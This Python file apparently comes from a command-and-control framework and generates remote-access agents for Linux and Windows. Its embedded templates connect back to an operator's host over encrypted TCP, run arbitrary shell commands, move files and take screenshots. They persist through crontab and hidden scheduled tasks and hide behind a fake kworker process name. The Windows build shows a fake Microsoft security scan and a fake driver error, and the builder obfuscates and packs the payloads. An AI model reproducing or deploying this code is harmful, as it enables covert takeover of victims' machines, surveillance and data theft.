import base64
import os
import random
import shutil
import subprocess as _subprocess
import sys
import zlib

from modules.crypto import generate_key

_CONFIG_PLAIN = '''IP = "{IP}"
PORT = {PORT}
KEY = b"{KEY}"
'''

_CONFIG_XOR = '''import base64 as _b
_XOR = 0x{XOR_KEY:02x}
_RAW = _b.b64decode("{CONFIG_B64}")
_DEC = bytes(b ^ _XOR for b in _RAW).decode().split("|")
IP = _DEC[0]
PORT = int(_DEC[1])
KEY = _DEC[2].encode()
del _XOR, _RAW, _DEC, _b
'''

_CONFIG_PS1_PLAIN = '''$IP = "{IP}"
$PORT = {PORT}
$KEY = "{KEY}"
'''

_CONFIG_PS1_XOR = '''$_XOR = 0x{XOR_KEY:02x}
$_RAW = [System.Convert]::FromBase64String("{CONFIG_B64}")
$_DEC = [byte[]]($_RAW | %{{ $_ -bxor $_XOR }})
$_STR = [System.Text.Encoding]::UTF8.GetString($_DEC).Split("|")
$IP = $_STR[0]
$PORT = [int]$_STR[1]
$KEY = $_STR[2]
Remove-Variable _XOR, _RAW, _DEC, _STR
'''

AGENT_LINUX_TEMPLATE = '''#!/usr/bin/env python3
import base64 as _b64
import hmac as _hmac
import os
import socket
import subprocess
import sys
import time

from cryptography.hazmat.primitives import padding as _pad
from cryptography.hazmat.primitives.ciphers import Cipher as _Cipher, algorithms as _alg, modes as _mod

# ---------- config ----------
{CONFIG_BLOCK}

# ---------- crypto ----------
def _enc(data):
    if isinstance(data, str):
        data = data.encode()
    raw = _b64.urlsafe_b64decode(KEY)
    ak, hk = raw[:16], raw[16:32]
    iv = os.urandom(16)
    p = _pad.PKCS7(128).padder()
    padded = p.update(data) + p.finalize()
    c = _Cipher(_alg.AES(ak), _mod.CBC(iv)).encryptor()
    ct = c.update(padded) + c.finalize()
    sig = _hmac.new(hk, iv + ct, "sha256").digest()
    return sig + iv + ct

def _dec(data):
    raw = _b64.urlsafe_b64decode(KEY)
    ak, hk = raw[:16], raw[16:32]
    sig, iv, ct = data[:32], data[32:48], data[48:]
    exp = _hmac.new(hk, iv + ct, "sha256").digest()
    if not _hmac.compare_digest(sig, exp):
        raise ValueError("bad hmac")
    c = _Cipher(_alg.AES(ak), _mod.CBC(iv)).decryptor()
    padded = c.update(ct) + c.finalize()
    u = _pad.PKCS7(128).unpadder()
    return u.update(padded) + u.finalize()

def _send(s, data):
    if isinstance(data, str):
        data = data.encode()
    p = _enc(data)
    s.sendall(len(p).to_bytes(4, "big") + p)

def _recv(s):
    h = s.recv(4)
    if not h:
        return None
    n = int.from_bytes(h, "big")
    d = b""
    while len(d) < n:
        c = s.recv(n - len(d))
        if not c:
            return None
        d += c
    return _dec(d)

# ---------- stealth ----------
def _stealth():
    try:
        import setproctitle
        setproctitle.setproctitle("[kworker/0:0]")
    except Exception:
        try:
            sys.argv[0] = "[kworker/0:0]"
        except Exception:
            pass

# ---------- persistence ----------
def _persist():
    try:
        p = os.path.abspath(sys.argv[0])
        e = ""
        try:
            e = subprocess.check_output(
                ["crontab", "-l"], stderr=subprocess.DEVNULL, text=True
            )
        except Exception:
            pass
        if "@reboot" in e and p in e:
            return
        l = "@reboot python3 " + p + " >/dev/null 2>&1\\n"
        t = "/tmp/.sysd"
        with open(t, "w") as f:
            f.write(e + l)
        subprocess.run(["crontab", t], capture_output=True, stderr=subprocess.DEVNULL)
        try:
            os.remove(t)
        except Exception:
            pass
    except Exception:
        pass

def _remove_persist():
    try:
        p = os.path.abspath(sys.argv[0])
        e = ""
        try:
            e = subprocess.check_output(
                ["crontab", "-l"], stderr=subprocess.DEVNULL, text=True
            )
        except Exception:
            pass
        lines = [l for l in e.split("\\n") if p not in l]
        t = "/tmp/.sysd_rm"
        with open(t, "w") as f:
            f.write("\\n".join(lines))
        subprocess.run(["crontab", t], capture_output=True, stderr=subprocess.DEVNULL)
        try:
            os.remove(t)
        except Exception:
            pass
    except Exception:
        pass

# ---------- command handler ----------
def _special(cmd, s):
    if cmd == "__ping__":
        _send(s, "__pong__")
        return True

    if cmd.startswith("__download__|"):
        path = cmd[13:]
        try:
            with open(path, "rb") as f:
                b = _b64.b64encode(f.read()).decode()
            _send(s, b)
        except Exception as e:
            _send(s, "__error__|" + str(e))
        return True

    if cmd.startswith("__upload__|"):
        parts = cmd.split("|", 2)
        if len(parts) < 3:
            _send(s, "__error__|invalid format")
            return True
        try:
            raw = _b64.b64decode(parts[2])
            d = os.path.dirname(parts[1])
            if d:
                os.makedirs(d, exist_ok=True)
            with open(parts[1], "wb") as f:
                f.write(raw)
            _send(s, "__ok__|" + str(len(raw)) + " bytes")
        except Exception as e:
            _send(s, "__error__|" + str(e))
        return True

    if cmd == "__selfdestruct__":
        _remove_persist()
        try:
            os.remove(sys.argv[0])
        except Exception:
            pass
        _send(s, "__selfdestruct__ok__")
        s.close()
        sys.exit(0)

    if cmd == "__info__":
        import uuid
        i = "|".join([
            sys.platform,
            os.name,
            os.getcwd(),
            os.path.expanduser("~"),
            os.getenv("USER", "unknown"),
            socket.gethostname(),
            str(uuid.uuid4()),
        ])
        _send(s, i)
        return True

    return False

# ---------- connect ----------
def _connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(60)
            s.connect((IP, PORT))
            _send(s, "beacon")
            while True:
                try:
                    d = _recv(s)
                    if d is None:
                        break
                    cmd = d.decode()
                    if _special(cmd, s):
                        continue
                    r = subprocess.run(
                        ["/bin/sh", "-c", cmd],
                        capture_output=True,
                        timeout=60,
                    )
                    out = r.stdout + r.stderr
                    if not out:
                        out = b"[OK]\\n"
                    _send(s, out)
                except subprocess.TimeoutExpired:
                    try:
                        _send(s, "[!] timeout")
                    except Exception:
                        pass
                    break
                except Exception:
                    break
            s.close()
        except Exception:
            pass
        time.sleep(30)

if __name__ == "__main__":
    _stealth()
    _persist()
    _connect()
'''

AGENT_WINDOWS_PS1_TEMPLATE = '''{CONFIG_BLOCK}

$KEY = $KEY.Replace('-', '+').Replace('_', '/')
$cwd = (Get-Location).Path

function _enc($d) {
    $r = [System.Convert]::FromBase64String($KEY)
    $ak = [byte[]]$r[0..15]; $hk = [byte[]]$r[16..31]
    $b = [System.Text.Encoding]::UTF8.GetBytes($d)
    $a = [System.Security.Cryptography.Aes]::Create()
    $a.KeySize = 128; $a.Key = $ak; $a.GenerateIV()
    $iv = $a.IV; $ct = $a.CreateEncryptor().TransformFinalBlock($b, 0, $b.Length)
    $a.Dispose()
    $h = [System.Security.Cryptography.HMACSHA256]::new($hk)
    $s = $h.ComputeHash([byte[]]($iv + $ct)); $h.Dispose()
    return [byte[]]($s + $iv + $ct)
}

function _dec($d) {
    $r = [System.Convert]::FromBase64String($KEY)
    $ak = [byte[]]$r[0..15]; $hk = [byte[]]$r[16..31]
    $s = [byte[]]$d[0..31]; $iv = [byte[]]$d[32..47]; $ct = [byte[]]$d[48..($d.Length-1)]
    $h = [System.Security.Cryptography.HMACSHA256]::new($hk)
    $ex = $h.ComputeHash([byte[]]($iv + $ct)); $h.Dispose()
    for ($i=0; $i -lt 32; $i++) { if ($s[$i] -ne $ex[$i]) { return $null } }
    $a = [System.Security.Cryptography.Aes]::Create()
    $a.KeySize = 128; $a.Key = $ak; $a.IV = $iv
    $pt = $a.CreateDecryptor().TransformFinalBlock($ct, 0, $ct.Length)
    $a.Dispose()
    return [System.Text.Encoding]::UTF8.GetString($pt)
}

function _send($s, $d) {
    $e = _enc $d
    $h = [System.BitConverter]::GetBytes($e.Length)
    [Array]::Reverse($h)
    $s.Write($h, 0, 4); $s.Write($e, 0, $e.Length)
}

function _recv($s) {
    $h = [byte[]]::new(4); $r = 0
    while ($r -lt 4) { $n = $s.Read($h, $r, 4 - $r); if ($n -le 0) { return $null }; $r += $n }
    [Array]::Reverse($h); $l = [System.BitConverter]::ToInt32($h, 0)
    $d = [byte[]]::new($l); $r = 0
    while ($r -lt $l) { $n = $s.Read($d, $r, $l - $r); if ($n -le 0) { return $null }; $r += $n }
    return _dec $d
}

function _exec($s, $cmd) {
    try {
        $out = & cmd /c $cmd 2>&1
        if ($out) { $out = ($out | Out-String) } else { $out = "[OK]`r`n" }
        _send $s $out
    } catch { _send $s "[!] $($_.Exception.Message)" }
}

function _special($s, $cmd) {
    if ($cmd -eq "__ping__") { _send $s "__pong__"; return $true }
    if ($cmd -like "__download__|*") {
        $p = $cmd.Substring(13)
        try { $b = [System.IO.File]::ReadAllBytes($p); _send $s ([System.Convert]::ToBase64String($b)) }
        catch { _send $s "__error__|$($_.Exception.Message)" }
        return $true
    }
    if ($cmd -like "__upload__|*") {
        $parts = $cmd.Split("|", 3)
        if ($parts.Length -lt 3) { _send $s "__error__|invalid format"; return $true }
        try {
            $b = [System.Convert]::FromBase64String($parts[2])
            $dir = [System.IO.Path]::GetDirectoryName($parts[1])
            if ($dir) { [System.IO.Directory]::CreateDirectory($dir) | Out-Null }
            [System.IO.File]::WriteAllBytes($parts[1], $b)
            _send $s "__ok__|$($b.Length) bytes"
        } catch { _send $s "__error__|$($_.Exception.Message)" }
        return $true
    }
    if ($cmd -like "__cd__|*") {
        $p = $cmd.Substring(6)
        try {
            [System.IO.Directory]::SetCurrentDirectory($p)
            $global:cwd = [System.IO.Directory]::GetCurrentDirectory()
            _send $s $global:cwd
        } catch { _send $s "__error__|$($_.Exception.Message)" }
        return $true
    }
    if ($cmd -eq "__selfdestruct__") {
        try { Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue } catch {}
        try { Remove-Item -Path $PSCommandPath -Force -ErrorAction SilentlyContinue } catch {}
        _send $s "__selfdestruct__ok__"
        $s.Close(); $client.Close(); exit
    }
    if ($cmd -eq "__info__") {
        $i = "$([Environment]::OSVersion.Platform)|$([Environment]::OSVersion.Version.ToString())|$cwd|$([Environment]::GetFolderPath('UserProfile'))|$([Environment]::UserName)|$([System.Net.Dns]::GetHostName())|$([Guid]::NewGuid().ToString())"
        _send $s $i; return $true
    }
    if ($cmd -eq "__ps__") {
        try { $r = tasklist /v /fo csv 2>&1 | Out-String; _send $s $r }
        catch { _send $s "__error__|$($_.Exception.Message)" }
        return $true
    }
    if ($cmd -eq "__screenshot__") {
        try {
            Add-Type -AssemblyName System.Drawing
            $bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
            $g = [System.Drawing.Graphics]::FromImage($bmp)
            $g.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
            $g.Dispose()
            $ms = New-Object System.IO.MemoryStream
            $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
            $bmp.Dispose()
            $b64 = [System.Convert]::ToBase64String($ms.ToArray())
            $ms.Dispose()
            _send $s $b64
        } catch { _send $s "__error__|$($_.Exception.Message)" }
        return $true
    }
    if ($cmd -eq "__spread__") {
        try {
            $paths = @()
            $src = $PSCommandPath
            $dest1 = "$([Environment]::GetFolderPath('ApplicationData'))\\Microsoft\\Windows\\updater.ps1"
            Copy-Item $src $dest1 -Force; $paths += $dest1
            $dest2 = "$([Environment]::GetFolderPath('MyDocuments'))\\~$R.ps1"
            Copy-Item $src $dest2 -Force -Hidden; $paths += $dest2
            if (Test-Path "$env:TEMP\\e.ps1") { $dest3 = "$([Environment]::GetFolderPath('ApplicationData'))\\Microsoft\\Windows\\cache.ps1"; Copy-Item "$env:TEMP\\e.ps1" $dest3 -Force; $paths += $dest3 }
            $taskName = "WindowsUpdateTask"
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dest1`""
            $trigger = New-ScheduledTaskTrigger -Daily -At 3am -RepetitionInterval (New-TimeSpan -Hours 1)
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
            $pathsStr = $paths -join "|"
            _send $s "__ok__|$($pathsStr)"
        } catch { _send $s "__error__|$($_.Exception.Message)" }
        return $true
    }
    return $false
}

Write-Host @"
 Windows Security Analyzer v2.1.4
 (C) Microsoft Corporation. All rights reserved.
 Initializing modules...
"@ -ForegroundColor Cyan

$steps = @(
    "Loading security policies...",
    "Checking firewall status...",
    "Verifying system integrity...",
    "Scanning startup entries...",
    "Analyzing network configuration..."
)
foreach ($s in $steps) {
    Write-Progress "Windows Security Analyzer" $s -PercentComplete (([array]::IndexOf($steps, $s) + 1) * 20)
    Start-Sleep -Milliseconds 300
}
Write-Progress "Windows Security Analyzer" "Complete" -Completed

Write-Host " No threats detected." -ForegroundColor Green
Write-Host " System is running in optimal state." -ForegroundColor Green
Write-Host ""

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.ReceiveTimeout = 60000; $client.SendTimeout = 30000
        $client.Connect($IP, $PORT)
        $s = $client.GetStream()
        try {
            _send $s "beacon|$env:COMPUTERNAME|$env:USERNAME"
            while ($true) {
                $cmd = _recv $s
                if ($cmd -eq $null) { break }
                if (_special $s $cmd) { continue }
                _exec $s "cd /d `"$cwd`" && $cmd"
            }
        } catch {}
        try { $s.Close() } catch {}
        try { $client.Close() } catch {}
    } catch {}
    Start-Sleep -Seconds 30
}'''


def _build_config_block(ip, port, key_str, obfuscation, ps1=False):
    if ps1:
        if obfuscation == "xor":
            xor_key = random.randint(1, 254)
            config_str = f"{ip}|{port}|{key_str}"
            obf = bytes(b ^ xor_key for b in config_str.encode())
            config_b64 = base64.b64encode(obf).decode()
            return _CONFIG_PS1_XOR.format(XOR_KEY=xor_key, CONFIG_B64=config_b64)
        else:
            return _CONFIG_PS1_PLAIN.format(IP=ip, PORT=port, KEY=key_str)
    else:
        if obfuscation == "xor":
            xor_key = random.randint(1, 254)
            config_str = f"{ip}|{port}|{key_str}"
            obf = bytes(b ^ xor_key for b in config_str.encode())
            config_b64 = base64.b64encode(obf).decode()
            return _CONFIG_XOR.format(XOR_KEY=xor_key, CONFIG_B64=config_b64)
        else:
            return _CONFIG_PLAIN.format(IP=ip, PORT=port, KEY=key_str)


def _generate_agent_code(ip, port, os_type, key, obfuscation):
    key_str = key.decode()

    if os_type == "windows":
        config_block = _build_config_block(ip, port, key_str, obfuscation, ps1=True)
        code = AGENT_WINDOWS_PS1_TEMPLATE.replace("{CONFIG_BLOCK}", config_block)
    else:
        config_block = _build_config_block(ip, port, key_str, obfuscation, ps1=False)
        code = AGENT_LINUX_TEMPLATE.replace("{CONFIG_BLOCK}", config_block)

    return code


def obfuscate_packed(code):
    compressed = zlib.compress(code.encode())
    b64 = base64.b64encode(compressed).decode()

    stub = '#!/usr/bin/env python3\nimport zlib as _z, base64 as _b\nexec(_z.decompress(_b.b64decode("' + b64 + '")))\n'
    return stub


def _clean_pyinstaller_artifacts(name):
    for p in ["build", name + ".spec"]:
        pth = os.path.join(os.getcwd(), p)
        if os.path.exists(pth):
            if os.path.isdir(pth):
                shutil.rmtree(pth, ignore_errors=True)
            else:
                try:
                    os.remove(pth)
                except Exception:
                    pass


def try_compile_exe(py_path, output_dir="payloads", verbose=True):
    pyinstaller = shutil.which("pyinstaller")
    if not pyinstaller:
        if verbose:
            print("  [!] PyInstaller not found. Install with: pip install pyinstaller")
        return None

    name = os.path.splitext(os.path.basename(py_path))[0]
    try:
        result = _subprocess.run(
            [
                pyinstaller,
                "--onefile",
                "--noconsole",
                "--distpath",
                output_dir,
                "--name",
                name,
                py_path,
            ],
            capture_output=True,
            text=True,
            timeout=180,
        )

        if result.returncode != 0:
            if verbose:
                err = result.stderr.strip() or result.stdout.strip()
                print(f"  [!] PyInstaller error: {err[:500]}")
            return None

        expected = os.path.join(output_dir, name)
        if os.path.exists(expected):
            return expected
        expected_exe = expected + ".exe"
        if os.path.exists(expected_exe):
            return expected_exe

        for f in os.listdir(output_dir):
            fp = os.path.join(output_dir, f)
            if os.path.isfile(fp) and (f == name or f == name + ".exe"):
                os.chmod(fp, 0o755)
                return fp

        if verbose:
            print(f"  [!] Binary not found after compilation")
            print(f"  [!] Check {output_dir}/ for output files")
        return None

    except _subprocess.TimeoutExpired:
        if verbose:
            print("  [!] PyInstaller timed out (3 min)")
        return None
    except Exception as e:
        if verbose:
            print(f"  [!] Compilation error: {e}")
        return None
    finally:
        _clean_pyinstaller_artifacts(name)


def _escape_c_string(text):
    r = text.replace("\\", "\\\\")
    r = r.replace("\n", "\\n")
    r = r.replace("\r", "\\r")
    r = r.replace("\t", "\\t")
    r = r.replace('"', '\\"')
    return r


def compile_windows_mingw(ps1_path, output_dir="payloads", verbose=True):
    """Cross-compile a Windows .exe from Linux using mingw-w64.
    Embeds the PowerShell script in a C launcher and compiles to a native PE."""
    mingw = shutil.which("x86_64-w64-mingw32-gcc")
    if not mingw:
        if verbose:
            print("  [!] mingw-w64 not found.")
            print("      Install: sudo apt install mingw-w64")
        return None

    name = os.path.splitext(os.path.basename(ps1_path))[0]

    try:
        with open(ps1_path, "r") as f:
            ps_code = f.read()
    except Exception as e:
        if verbose:
            print(f"  [!] Failed to read {ps1_path}: {e}")
        return None

    escaped = _escape_c_string(ps_code)

    c_src = (
        '#include <windows.h>\n'
        '#include <stdio.h>\n'
        '#define C "' + escaped + '"\n'
        'int WINAPI WinMain(HINSTANCE h,HINSTANCE hp,LPSTR lp,int ns){\n'
        'char t[MAX_PATH],p[MAX_PATH],c[1100];DWORD n;\n'
        'GetTempPathA(sizeof(t),t);\n'
        'snprintf(p,sizeof(p),"%se.ps1",t);\n'
        'HANDLE f=CreateFileA(p,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,'
        'FILE_ATTRIBUTE_NORMAL,NULL);\n'
        'if(!f)return 1;\n'
        'WriteFile(f,C,strlen(C),&n,NULL);\n'
        'CloseHandle(f);\n'
        'STARTUPINFOA si={0};PROCESS_INFORMATION pi={0};\n'
        'si.cb=sizeof(si);si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;\n'
        'snprintf(c,sizeof(c),"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \\"%s\\"",p);\n'
        'CreateProcessA(NULL,c,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);\n'
        'CloseHandle(pi.hProcess);CloseHandle(pi.hThread);\n'
        'MessageBoxA(NULL,"0x887A0005 - Failed to initialize graphics device.\\n\\nPlease update your display driver and restart the application.","Display Driver Error",MB_OK|MB_ICONERROR);\n'
        'return 0;\n'
        '}\n'
    )

    src_path = os.path.join(output_dir, "_" + name + ".c")
    exe_path = os.path.join(output_dir, name + ".exe")

    try:
        with open(src_path, "w") as f:
            f.write(c_src)

        result = _subprocess.run(
            [mingw, "-Os", "-s", "-mwindows", "-o", exe_path, src_path],
            capture_output=True, text=True, timeout=60,
        )

        if result.returncode != 0:
            if verbose:
                err = result.stderr.strip() or result.stdout.strip()
                print(f"  [!] mingw-w64 error: {err[:500]}")
            return None

        if not os.path.exists(exe_path):
            if verbose:
                print("  [!] .exe not found after compilation")
            return None

        return exe_path

    except _subprocess.TimeoutExpired:
        if verbose:
            print("  [!] Compilation timed out")
        return None
    except Exception as e:
        if verbose:
            print(f"  [!] Compilation error: {e}")
        return None
    finally:
        try:
            os.remove(src_path)
        except Exception:
            pass


def generate_payload(ip, port, os_type="linux", key=None, obfuscation="none", compile_exe=False, output_dir="payloads", name=None):
    if key is None:
        key = generate_key()

    if os_type not in ("linux", "windows"):
        os_type = "linux"

    if obfuscation not in ("none", "xor", "packed"):
        obfuscation = "none"

    is_win = os_type == "windows"
    prefix = "agent_windows" if is_win else "agent_linux"
    ext = ".ps1" if is_win else ".py"
    safe_ip = ip.replace(".", "_").replace(":", "_")

    if name:
        filename = name if name.endswith(ext) else name + ext
    elif obfuscation == "packed":
        if is_win:
            code = _generate_agent_code(ip, port, os_type, key, obfuscation)
            filename = f"{prefix}_{safe_ip}_{port}_packed.ps1"
        else:
            plain_code = _generate_agent_code(ip, port, os_type, key, "none")
            code = obfuscate_packed(plain_code)
            filename = f"{prefix}_{safe_ip}_{port}_packed.py"
    else:
        code = _generate_agent_code(ip, port, os_type, key, obfuscation)
        suffix = "_obf" if obfuscation == "xor" else ""
        filename = f"{prefix}_{safe_ip}_{port}{suffix}{ext}"

    os.makedirs(output_dir, exist_ok=True)
    filepath = os.path.join(output_dir, filename)

    with open(filepath, "w") as f:
        f.write(code)

    if not is_win:
        os.chmod(filepath, 0o755)

    exe_path = None
    if compile_exe:
        host = sys.platform.lower()
        on_linux = not host.startswith("win")

        if is_win and on_linux:
            print("  [*] Cross-compiling Windows .exe with mingw-w64...")
            exe_path = compile_windows_mingw(filepath, output_dir)
        elif not is_win and on_linux:
            print("  [*] Compiling Linux binary with PyInstaller...")
            exe_path = try_compile_exe(filepath, output_dir)
        elif is_win and not on_linux:
            print("  [*] Compiling Windows .exe with PyInstaller...")
            exe_path = try_compile_exe(filepath, output_dir)
        else:
            print("  [!] Cannot compile Linux binary from Windows.")

    return filepath, key.decode(), exe_path
